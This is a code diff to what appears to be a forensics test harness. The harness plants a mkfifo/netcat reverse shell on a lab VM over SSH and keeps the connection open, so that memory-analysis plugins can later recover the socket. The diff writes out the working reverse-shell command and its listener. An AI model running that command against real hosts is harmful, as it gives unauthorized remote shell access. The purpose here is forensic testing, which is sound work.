@@ -26,6 +26,12 @@ from typing import Protocol
 _REVSHELL_PORT = 4444
 _REVSHELL_TIMEOUT = 10
 
+# Connections held open for the acquisition window when keep_open=True. Module
+# level so the accepted socket outlives run_reverse_shell and stays ESTABLISHED
+# until the process exits (i.e. through memory acquisition). The OS closes them
+# on interpreter shutdown; we never touch them again.
+_HELD_SOCKETS: list[socket.socket] = []
+
 
 class ScenarioProtocol(Protocol):
     def run(
@@ -145,32 +151,37 @@ def run_reverse_shell(
 
     def _listen() -> None:
         try:
-            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as srv:
-                srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-                srv.bind(("0.0.0.0", port))
-                srv.listen(1)
-                srv.settimeout(timeout)
-                conn, addr = srv.accept()
-                console.ok(f"reverse shell connected from {addr}")
+            srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            srv.bind(("0.0.0.0", port))
+            srv.listen(1)
+            srv.settimeout(timeout)
+            conn, addr = srv.accept()
+            srv.close()
+            console.ok(f"reverse shell connected from {addr}")
 
-                conn.sendall(b"id\n")
-                time.sleep(0.8)
-                data = conn.recv(4096).decode(errors="replace")
-                clean = [
-                    ln
-                    for ln in data.splitlines()
-                    if ln.strip()
-                    and not ln.startswith("/bin/sh:")
-                    and not ln.strip().startswith(("$", "#"))
-                ]
-                received.append("\n".join(clean).strip())
+            conn.sendall(b"id\n")
+            time.sleep(0.8)
+            data = conn.recv(4096).decode(errors="replace")
+            clean = [
+                ln
+                for ln in data.splitlines()
+                if ln.strip()
+                and not ln.startswith("/bin/sh:")
+                and not ln.strip().startswith(("$", "#"))
+            ]
+            received.append("\n".join(clean).strip())
 
-                if keep_open:
-                    console.ok("reverse shell left open for acquisition window")
-                    time.sleep(timeout)
-                else:
-                    conn.sendall(b"exit\n")
-
+            if keep_open:
+                # Hold the connection open so the VM-side nc stays resident with
+                # an ESTABLISHED socket through memory acquisition; linux.sockstat
+                # then recovers it. Closed when the process exits.
+                _HELD_SOCKETS.append(conn)
+                console.ok("reverse shell left open for acquisition window")
+            else:
+                # Tear it down: nc exits, leaving the socket in CLOSE for
+                # linux.sockscan to recover post-mortem.
+                conn.sendall(b"exit\n")
                 conn.close()
         except Exception as exc:
             error.append(str(exc))
@@ -180,9 +191,14 @@ def run_reverse_shell(
     time.sleep(0.3)
 
     fifo = "/tmp/.rs_fifo"
+    # Classic mkfifo reverse shell (PentestMonkey). Backgrounded with its stdio
+    # detached to /dev/null so ssh.run's recv_exit_status() returns instead of
+    # blocking until nc exits. paramiko allocates no PTY, so the job has no
+    # controlling terminal and survives the channel closing -- no nohup/setsid.
     cmd = (
         f"rm -f {fifo}; mkfifo {fifo}; "
-        f"cat {fifo} | /bin/sh -i 2>&1 | nc {host_ip} {port} > {fifo} &"
+        f"(cat {fifo} | /bin/sh -i 2>&1 | nc {host_ip} {port} > {fifo}) "
+        f"</dev/null >/dev/null 2>&1 &"
     )
     code, _, _ = ssh.run(cmd, timeout=15)
     listener.join(timeout=timeout + 2)
